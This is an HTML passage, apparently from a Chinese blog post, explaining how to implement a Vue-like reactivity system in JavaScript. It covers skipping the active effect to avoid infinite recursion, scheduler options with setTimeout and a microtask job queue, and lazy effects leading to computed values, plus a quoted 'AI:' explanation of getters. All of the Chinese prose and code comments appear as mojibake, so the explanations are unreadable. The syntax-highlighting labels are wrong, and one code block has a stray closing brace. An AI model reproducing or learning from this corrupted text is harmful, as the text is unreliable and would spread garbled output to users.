<h2 data-id="heading-10">06-é¿å…æ— é™é€’å½’å¾ªç¯</h2>
<p>ä¸ºä»€ä¹ˆä¼šå‡ºç°æ— é™é€’å½’å¾ªç¯çš„é—®é¢˜å‘¢ï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> data = {<span class="hljs-attr">foo</span>:<span class="hljs-number">1</span>}
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>()
<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    obj.<span class="hljs-property">foo</span>++
})
</code></pre>
<p>å½“æˆ‘ä»¬è¿è¡Œå¦‚ä¸Šä»£ç çš„æ—¶å€™ï¼Œå°±ç›¸å½“äºå¼€å¯äº†æ— é™é€’å½’æ¨¡å¼ã€‚</p>
<p>æˆ‘ä»¬ä¸æ–­åœ¨æ³¨å†Œçš„å‰¯ä½œç”¨å‡½æ•°ä¸­æ‰§è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj.foo</span> = obj.foo+<span class="hljs-number">1</span>
</code></pre>
<p>å®ƒæ—¢è¯»å–åˆè®¾ç½®ã€‚</p>
<p>é‚£ä¹ˆåº”è¯¥æ€ä¹ˆé¿å…è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬çŸ¥é“ activeEffect å®é™…å°±æ˜¯å½“å‰æ¿€æ´»çš„è¦æ·»åŠ åˆ°ä¾èµ–åºåˆ—ä¸­çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸‹ï¼Œå½“å‰æ‰§è¡Œçš„å‡½æ•°æ˜¯å¦å’ŒactiveEffectæ˜¯å¦ç›¸åŒ å°±å¯ä»¥å®ç° é¿å…æ— é™é€’å½’å¾ªç¯ã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">//åœ¨setå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
<span class="hljs-keyword">const</span> trigger=(target,key)=&gt;{
   <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
   let depsMap = bucket.<span class="hljs-keyword">get</span>(target)
   <span class="hljs-keyword">if</span>(!depsMap) <span class="hljs-keyword">return</span> ;
   <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
   <span class="hljs-keyword">const</span> effects = depsMap.<span class="hljs-keyword">get</span>(key)
       <span class="hljs-comment">//add - ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ</span>
       <span class="hljs-keyword">const</span> effectToRun = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>()
       effects.forEach(effectFn=&gt;{
          <span class="hljs-keyword">if</span>(effectFn !== activeEffect){
             effectToRun.add(effectFn)
           }
        })
       effectToRun.forEach(effectFn=&gt;effectFn())
}
</code></pre>
<h2 data-id="heading-11">07-è°ƒåº¦æ‰§è¡Œ</h2>
<p>ä»€ä¹ˆæ˜¯è°ƒåº¦æ‰§è¡Œï¼Ÿ</p>
<p>å°±æ˜¯trigger è§¦å‘ å‰¯ä½œç”¨å‡½æ•°é‡æ–°æ‰§è¡Œæ—¶ï¼Œ<strong>æœ‰èƒ½åŠ›æ§åˆ¶ æ‰§è¡Œçš„æ—¶æœºï¼Œæ¬¡æ•°å’Œæ–¹å¼</strong>ã€‚</p>
<h3 data-id="heading-12">æ‰§è¡Œçš„æ—¶æœº</h3>
<p>å‡å¦‚æˆ‘ä»¬æƒ³è¦å®ç°å¦‚ä¸‹çš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> data = {<span class="hljs-attr">foo</span>:<span class="hljs-number">1</span>}
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(...)
<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>)
})
obj.<span class="hljs-property">foo</span>++
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»“æŸäº†'</span>)
</code></pre>
<p>å®ƒçš„æ‰“å°é¡ºåºæ˜¯</p>
<pre><code class="hljs">1
2
ç»“æŸäº†
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬éœ€è¦çš„æ•ˆæœæ˜¯ï¼š</p>
<pre><code class="hljs">1
ç»“æŸäº†
2
</code></pre>
<p>åº”è¯¥å¦‚ä½•å®ç°å‘¢ï¼Ÿ</p>
<p>å®é™…å®ƒå°±æ˜¯åœ¨æ‰§è¡Œçš„å‰¯ä½œç”¨å‡½æ•°çš„æ—¶å€™æ·»åŠ äº†ä¸€ä¸ªå®ä»»åŠ¡ï¼Œè®©å®ƒå»¶è¿Ÿæ‰§è¡Œï¼Œé—®é¢˜æ˜¯æˆ‘åº”è¯¥æ€ä¹ˆæ·»åŠ å‘¢ï¼Ÿ</p>
<p>æˆ‘éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°è¿›å»ï¼Œåœ¨å‡½æ•°æ‰§è¡Œçš„æ—¶å€™åˆ¤æ–­ï¼Œæˆ‘ä¼ å…¥çš„è¿™ä¸ªå‚æ•°åœ¨ä¸åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æ‰§è¡Œæˆ‘çš„å‡½æ•°ï¼Œ</p>
<p>ç„¶åæˆ‘åœ¨æˆ‘çš„å‡½æ•°é‡Œé¢åŠ ä¸Šå»¶è¿Ÿçš„åŠŸèƒ½ï¼Œå°±å®ç°äº†ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn,options = {})=&gt;{
   if (!fn) return ;
   const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
      effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
           <span class="hljs-comment">//åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
           effectStack<span class="hljs-selector-class">.pop</span>()
           <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
           activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
       }
   <span class="hljs-comment">//add--å°†optionsæŒ‚åœ¨åˆ°å¯¹åº”çš„effectFnä¸Šé¢</span>
       effectFn<span class="hljs-selector-class">.options</span> = options
   <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
   effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
   <span class="hljs-built_in">effectFn</span>()
   }
</code></pre>
<p>æˆ‘ä»¬åœ¨æ³¨å†Œå‡½æ•°çš„æ—¶å€™æ·»åŠ ä¸€ä¸ªå‚æ•°<code>options</code> ï¼ŒæŠŠå®ƒæŒ‚åœ¨åˆ°å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢ <code>effectFn</code>.</p>
<p>ç„¶åå†æ‰§è¡Œçš„æ—¶å€™åˆ¤æ–­ æ˜¯å¦å­˜åœ¨å¯¹åº”çš„è°ƒåº¦å™¨<code>scheduler</code> ï¼Œå¦‚æœå­˜åœ¨ å°±æ‰§è¡Œï¼Œå¹¶æŠŠå½“å‰çš„å‰¯ä½œç”¨å‡½æ•°ä¼ å…¥è¿›å»ä½œä¸ºå‚æ•°</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//åœ¨setå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
const trigger=(target,key)=&gt;{
   <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
   let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
   <span class="hljs-built_in">if</span>(!depsMap) return ;
   <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
   const effects = depsMap<span class="hljs-selector-class">.get</span>(key)
   <span class="hljs-comment">//add - ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ</span>
   const effectToRun = new <span class="hljs-built_in">Set</span>()
   effects<span class="hljs-selector-class">.forEach</span>(effectFn=&gt;{
      if(effectFn !== activeEffect){
         effectToRun<span class="hljs-selector-class">.add</span>(effectFn)
      }
   })
   effectToRun<span class="hljs-selector-class">.forEach</span>(effectFn=&gt;{
      //add--åˆ¤æ–­å½“å‰çš„å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢æ˜¯å¦å­˜åœ¨è°ƒåº¦å™¨
      if(effectFn.options.scheduler){
         effectFn<span class="hljs-selector-class">.options</span><span class="hljs-selector-class">.scheduler</span>(effectFn)
           }else{
         <span class="hljs-built_in">effectFn</span>()
           }
       })
}
</code></pre>
<p>æ¥ç€çœ‹ä¸€ä¸‹æ•ˆæœï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">registerEffect</span>(()=&gt;{
console<span class="hljs-selector-class">.log</span>(obj.foo)
  },{
<span class="hljs-built_in">scheduler</span>(fn){
   <span class="hljs-built_in">setTimeout</span>(fn)
      }
  })
  obj<span class="hljs-selector-class">.foo</span>++
  console<span class="hljs-selector-class">.log</span>('ç»“æŸäº†')

<span class="hljs-number">1</span>
ç»“æŸäº†
<span class="hljs-number">2</span>
</code></pre>
<p>å®Œç¾å®ç°ã€‚</p>
<h3 data-id="heading-13">è°ƒåº¦å™¨ä¸æ§åˆ¶æ‰§è¡Œå¤šæ¬¡</h3>
<p>éœ€æ±‚ï¼š</p>
<pre><code class="hljs">obj.foo++
obj.foo++
</code></pre>
<p>ç»“æœè™½ç„¶æ˜¯ä» 1 åŠ åˆ° 2 åŠ åˆ° 3</p>
<p>ä½†æ˜¯ æˆ‘ä»¬åªæƒ³è¦æœ€åçš„ä¸€æ¬¡ ä¸­é—´çš„çŠ¶æ€ä¸æƒ³è¦ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript">
  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—</span>
  <span class="hljs-keyword">const</span> jobQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  <span class="hljs-comment">//ä½¿ç”¨Promise.resolveåˆ›å»ºä¸€ä¸ªpromiseå®ä¾‹ï¼Œæˆ‘ä»¬ç”¨å®ƒå°†ä¸€ä¸ªä»»åŠ¡æ·»åŠ åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—é‡Œé¢</span>
  <span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()
  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæ ‡è¯† æ˜¯å¦æ­£åœ¨åˆ·æ–°é˜Ÿåˆ—</span>
  <span class="hljs-keyword">let</span> isFlushing = <span class="hljs-literal">false</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">flushJob</span>(<span class="hljs-params"/>){
<span class="hljs-comment">//å¦‚æœä»»åŠ¡é˜Ÿåˆ—æ­£åœ¨åˆ·æ–° åˆ™ä»€ä¹ˆéƒ½ä¸åš</span>
      <span class="hljs-keyword">if</span>(isFlushing){
           <span class="hljs-keyword">return</span>
          }
        isFlushing = <span class="hljs-literal">true</span>
        p.<span class="hljs-title function_">then</span>(<span class="hljs-function">()=&gt;</span>{
        <span class="hljs-comment">//åœ¨å¾®ä»»åŠ¡ä¸­æ‰§è¡Œ ä¼šå»¶è¿Ÿ</span>
           jobQueue.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">job</span>=&gt;</span><span class="hljs-title function_">job</span>())
              }).<span class="hljs-title function_">finally</span>(<span class="hljs-function">()=&gt;</span>{
           isFlushing = <span class="hljs-literal">false</span>
              })
  }

  <span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>)
      },
      {
        <span class="hljs-title function_">scheduler</span>(<span class="hljs-params">fn</span>){
           <span class="hljs-comment">//æ¯æ¬¡è°ƒåº¦çš„æ—¶å€™ æŠŠå‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°jobQueueé˜Ÿåˆ—ä¸­</span>
           jobQueue.<span class="hljs-title function_">add</span>(fn)
          <span class="hljs-title function_">flushJob</span>()
      }
  })
  obj.<span class="hljs-property">foo</span>++
  obj.<span class="hljs-property">foo</span>++
  obj.<span class="hljs-property">foo</span>++
  obj.<span class="hljs-property">foo</span>++
  
 æ‰§è¡Œç»“æœï¼š
 <span class="hljs-number">1</span>
 <span class="hljs-number">5</span>
</code></pre>
<p>åŸç†ï¼š</p>
<ul>
<li>åˆ©ç”¨setçš„ç‰¹æ€§ é‡å¤çš„fnåªä¼šæ·»åŠ ä¸€æ¬¡</li>
<li>åˆ©ç”¨å¾®æœåŠ¡çš„æ‰§è¡Œæ—¶æœºï¼Œå¾®æœåŠ¡å®ƒçš„æ‰§è¡Œæ˜¯åœ¨å½“å‰å®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ä»¥åæ‰ä¼šæŸ¥æ‰¾åˆ¤æ–­å¾®ä»»åŠ¡é˜Ÿåˆ—ã€‚</li>
</ul>
<p>åœ¨æˆ‘ä»¬ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è™½ç„¶æ·»åŠ äº†å¤šæ¬¡fn å¹¶ä¸”åˆ·æ–°äº†å¤šæ¬¡flushJob()ï¼Œå®é™…ä¸Šå®ƒå¹¶æ²¡æœ‰å¤šæ¬¡æ‰§è¡Œã€‚</p>
<p>æˆ‘ä»¬åœ¨æ‰§è¡ŒisFlushing çš„æ—¶å€™è¿›è¡Œäº†æ‹¦æˆª ä¸ä¼šå¤šæ¬¡è°ƒç”¨ï¼Œå¦å¤–ä¸€ä¸ªæˆ‘ä»¬è™½ç„¶æ·»åŠ äº†å¤šæ¬¡ï¼Œç”±äºsetçš„ç‰¹æ€§ï¼Œé‡Œé¢å§‹ç»ˆåªæœ‰ä¸€ä¸ªï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå¤šæ¬¡æ‰§è¡Œï¼Œè€Œæ˜¯åªä¼šæ‹¿åˆ°å®ƒçš„æœ€ç»ˆå¤ªã€‚</p>
<p>æœ‰ä¸€ç‚¹å·§å¦™å•Š å±…ç„¶è¿˜ç”¨åˆ°äº†å¾®æœåŠ¡çš„ç‰¹æ€§ã€‚</p>
<blockquote>
<p>ä¹¦ä¸ŠåŸæ–‡çš„è¯´æ˜ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ae891e0be6149f3b3fea3cb5e37bb62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo6aOe6aOe6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666076&amp;x-signature=c2WYmGvP%2BG%2FFERVnC%2F9nnamOUN0%3D" alt="" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-14">08-è®¡ç®—å±æ€§computed ä¸ lazy</h2>
<p>æˆ‘ä»¬ç°åœ¨çš„ä»£ç æ˜¯ä¼šç«‹å³æ‰§è¡Œä¼ é€’ç»™å®ƒçš„å‰¯ä½œç”¨å‡½æ•°</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">registerEffect</span>(()=&gt;{
    <span class="hljs-comment">//...</span>
})
</code></pre>
<h3 data-id="heading-15">ä¸ºä»€ä¹ˆä¼šç«‹å³æ‰§è¡Œå‘¢ï¼Ÿ</h3>
<p>å› ä¸ºæˆ‘ä»¬åœ¨æ³¨å†Œå‡½æ•°çš„æ—¶å€™ï¼Œéœ€è¦å…ˆè§¦å‘ä¸€æ¬¡å‡½æ•°ï¼ŒæŠŠå¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°è§¦å‘çš„æ‹¦æˆªå¯¹è±¡çš„ å¯¹åº”çš„å±æ€§ä¸Šï¼ŒæŠŠå‰¯ä½œç”¨å‡½æ•°æŒ‚è½½ä¸Šå»ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿæ‡’æ‰§è¡Œï¼Œåœ¨éœ€è¦çš„æ—¶å€™æ‰§è¡Œï¼Œé‚£ä¹ˆåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>å¯ä»¥å‚è€ƒæˆ‘ä»¬ä¸Šé¢çš„è°ƒåº¦å™¨ï¼Œæˆ‘ä»¬ä¼ é€’ä¸€ä¸ªlazyçš„å‚æ•°ç»™optionsï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™åˆ¤æ–­ï¼Œå¦‚æœæœ‰è¿™ä¸ªå±æ€§ï¼Œæˆ‘ä»¬å°±ä¸æ‰§è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-comment">//...</span>
},{
    <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>
})
</code></pre>
<h3 data-id="heading-16">å¦‚ä½•å®ç°æ‡’æ‰§è¡Œå‘¢ï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript">  <span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>)
      },{
    <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>
  })
</code></pre>
<p>æ³¨å†Œå‡½æ•°çš„å®ç°</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn,options = {})=&gt;{
       if (!fn) return ;
       const effectFn=()=&gt;{
          <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
          <span class="hljs-built_in">cleanup</span>(effectFn)
          <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
          activeEffect = effectFn;
          <span class="hljs-comment">//åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
          effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
          <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
          <span class="hljs-built_in">fn</span>()
           <span class="hljs-comment">//åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
           effectStack<span class="hljs-selector-class">.pop</span>()
           <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
           activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
           }
          <span class="hljs-comment">//å°†optionsæŒ‚åœ¨åˆ°å¯¹åº”çš„effectFnä¸Šé¢</span>
           effectFn<span class="hljs-selector-class">.options</span> = options
          <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
           effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
           <span class="hljs-comment">//add--æ‰§è¡Œè¯¥å‡½æ•°</span>
           <span class="hljs-built_in">if</span>(!options.lazy){
               <span class="hljs-built_in">effectFn</span>()
           }
           <span class="hljs-comment">//add--å°†å‰¯ä½œç”¨å‡½æ•°ä½œä¸ºè¿”å›å€¼è¿”å›</span>
           return effectFn
       }
   }
</code></pre>
<p>æˆ‘ä»¬ç°åœ¨ä»£ç æ˜¯æ‡’æ‰§è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å…·ä½“ä»€ä¹ˆæ—¶å€™æ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å®é™…ä¸Šè¿”å›äº†å‰¯ä½œç”¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±æ‰‹åŠ¨æ‰§è¡Œï¼Œä½†æ˜¯è¿™æ ·åšæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ</p>
<h3 data-id="heading-17">å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªè¿”å›çš„å€¼ä½œä¸ºä¸€ä¸ªgetterå‡½æ•°å‘¢ï¼Ÿè¿™æ ·å°±å¯ä»¥è¿”å›ä»»ä½•å€¼äº†</h3>
<blockquote>
<p>AI:è¿™å¥è¯çš„æ„æ€æ˜¯åœ¨æ„å»ºå“åº”å¼ç³»ç»Ÿæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‰¯ä½œç”¨å‡½æ•°è®¾è®¡ä¸ºä¸€ä¸ªè®¿é—®å™¨å±æ€§ï¼ˆgetterï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œè¿™æ ·æ¯æ¬¡è®¿é—®è¯¥å±æ€§æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œè¿›è€Œå¯ä»¥åŠ¨æ€åœ°â€œè·å–â€æˆ–è®¡ç®—å‡ºæŸä¸ªå€¼ã€‚è¿™é‡Œçš„â€œè¿”å›ä»»ä½•å€¼â€æ„å‘³ç€å‰¯ä½œç”¨å‡½æ•°å†…éƒ¨å¯ä»¥è¿›è¡Œå¤æ‚çš„é€»è¾‘å¤„ç†ï¼Œæœ€ç»ˆè®¡ç®—å¹¶è¿”å›æ‰€éœ€çš„æ•°æ®æˆ–ç»“æœã€‚</p>
<p>å…·ä½“åˆ°Vueæˆ–ç±»ä¼¼çš„æ¡†æ¶ä¸­ï¼Œå½“æåˆ°â€œå‰¯ä½œç”¨å‡½æ•°ä½œä¸ºä¸€ä¸ªgetterå‡½æ•°â€ï¼Œé€šå¸¸æ˜¯æŒ‡åœ¨å®ç°è®¡ç®—å±æ€§ï¼ˆå¦‚Vueä¸­çš„computedï¼‰çš„åœºæ™¯ã€‚è®¡ç®—å±æ€§æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªä¾èµ–å…¶ä»–æ•°æ®çš„getterå‡½æ•°ï¼Œå®ƒè¿”å›çš„å€¼æ˜¯åŸºäºå…¶ä»–æ•°æ®è®¡ç®—å¾—å‡ºçš„ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½æœ‰ä¾èµ–äºå¤šä¸ªçŠ¶æ€å€¼çš„è®¡ç®—é€»è¾‘ï¼Œè¿™ä¸ªè®¡ç®—é€»è¾‘å°è£…åœ¨getterä¸­ï¼Œæ¯å½“ä¾èµ–çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œgetterå°±ä¼šé‡æ–°æ‰§è¡Œï¼Œè®¡ç®—å‡ºæ–°çš„ç»“æœå¹¶è¿”å›ã€‚</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œè¿™ç§æ–¹å¼å…è®¸æˆ‘ä»¬å°è£…æ•°æ®å¤„ç†é€»è¾‘ï¼Œå¹¶ä¸”è¿™ä¸ªé€»è¾‘çš„æ‰§è¡Œï¼ˆå³å‰¯ä½œç”¨çš„å‘ç”Ÿï¼‰æ˜¯ç”±å¯¹æŸä¸ªå±æ€§çš„è®¿é—®è‡ªåŠ¨è§¦å‘çš„ï¼Œè€Œè¿™ä¸ªå±æ€§ä»¿ä½›å…·æœ‰äº†â€œåŠ¨æ€è®¡ç®—â€çš„èƒ½åŠ›ï¼Œå¯ä»¥æ ¹æ®åº•å±‚æ•°æ®çš„å˜åŒ–å®æ—¶æ›´æ–°å…¶å€¼ã€‚å› æ­¤ï¼Œâ€œæŠŠå‰¯ä½œç”¨å‡½æ•°ä½œä¸ºä¸€ä¸ªgetterå‡½æ•°â€æ˜¯ä¸€ç§å®ç°åŠ¨æ€æ•°æ®ç»‘å®šå’Œè‡ªåŠ¨æ›´æ–°çš„æœ‰æ•ˆç­–ç•¥ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">effectFn</span> = effect(()=&gt;obj.foo+obj.bar,{lazy:<span class="hljs-literal">true</span>})
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬æ‰‹åŠ¨æ‰§è¡Œå‡½æ•°çš„æ—¶å€™ å°±èƒ½æ‹¿åˆ°è¿”å›å€¼äº†</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">res</span> = effectFn()
</code></pre>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬çš„æ³¨å†Œå‡½æ•°è¿›è¡Œæ”¹é€ ä¸€ä¸‹ï¼Œæ—¢ç„¶éœ€è¦æŠŠæ‰§è¡Œç»“æœçš„æ•°æ®è¿”å›ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨æˆ‘ä»¬çœŸæ­£çš„å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œçš„åœ°æ–¹åŠ¨æ‰‹è„šã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn,options = {})=&gt;{
   if (!fn) return ;
   const effectFn=()=&gt;{
          <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
          <span class="hljs-built_in">cleanup</span>(effectFn)
          <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
          activeEffect = effectFn;
          <span class="hljs-comment">//åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
          effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
          <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
          <span class="hljs-comment">//add--å°†fnçš„æ‰§è¡Œç»“æœå­˜å‚¨åˆ°resä¸­</span>
          const res = <span class="hljs-built_in">fn</span>()
           <span class="hljs-comment">//åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
           effectStack<span class="hljs-selector-class">.pop</span>()
           <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
           activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
           <span class="hljs-comment">//addå°†res ä½œä¸º effectFnçš„è¿”å›å€¼ã€‚</span>
           return res;
       }
       <span class="hljs-comment">//å°†optionsæŒ‚åœ¨åˆ°å¯¹åº”çš„effectFnä¸Šé¢</span>
       effectFn<span class="hljs-selector-class">.options</span> = options
